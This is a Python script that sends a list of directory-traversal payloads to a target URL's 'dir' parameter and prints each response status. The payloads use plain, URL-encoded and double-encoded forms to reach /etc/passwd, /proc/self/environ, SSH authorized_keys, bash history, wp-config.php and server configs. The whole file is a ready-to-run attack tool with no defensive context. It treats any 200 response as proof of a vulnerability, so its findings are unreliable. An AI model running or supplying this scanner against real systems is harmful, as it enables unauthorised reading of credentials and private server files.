import requests

def check_directory_traversal(url):
    payloads = [
        "../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
        "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2F",
        "..%2F..%2F..%2F..%2F..%2F",
        "../../../../../../../../var/log/messages",
        "../../../../../../../../var/log/syslog",
        "../../../../../../../../proc/self/environ",
        "../../../../../../../../proc/self/status",
        "../../../../../../../../var/www/html/index.php",
        "../../../../../../../../var/www/html/config.php",
        "../../../../../../../../var/tmp/",
        "../../../../../../../../home/user/.ssh/authorized_keys",
        "../../../../../../../../home/user/.bash_history",
        "../../../../../../../../../var/log/apache2/access.log",
        "../../../../../../../../../var/log/apache2/error.log",
        "../../../../../../../../../var/backups",
        "../../../../../../../../../var/www/html/admin/config.php",
        "../../../../../../../../../var/www/html/wp-config.php",
        "../../../../../../../../../etc/mysql/my.cnf",
        "../../../../../../../../../etc/httpd/conf/httpd.conf",
        "../../../../../../../../../usr/local/etc/php.ini",
        "../../../../../../../../../usr/share/wordlists/rockyou.txt",
        "../../../../../../../../../usr/share/dict/words",
        "..%2F..%2F..%2F..%2Fweb%2F",
        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2F",
        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2Fadmin%2F",
        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2Fprivate%2F",
        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2Fuploads%2F",
        "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fweb%2F",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "..%252F..%252F..%252F..%252Fvar%252Flog%252Fsyslog",
        "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fusr%2Flocal%2Fbin%2F",
        "..%252F..%252F..%252F..%252Fhome%252Fuser%252F.ssh%252Fauthorized_keys",
    ]
    
    for payload in payloads:
        test_url = f"{url}?dir={payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"Vulnerable to Directory Traversal: {test_url}")
            elif response.status_code == 403:
                print(f"Forbidden: {test_url}")
            elif response.status_code == 401:
                print(f"Unauthorized: {test_url}")
            elif response.status_code == 404:
                print(f"Not Found: {test_url}")
            else:
                print(f"Unexpected Status ({response.status_code}): {test_url}")
        except Exception as e:
            print(f"Error checking {test_url}: {str(e)}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 check_directory_traversal.py <url>")
    else:
        url = sys.argv[1]
        check_directory_traversal(url)
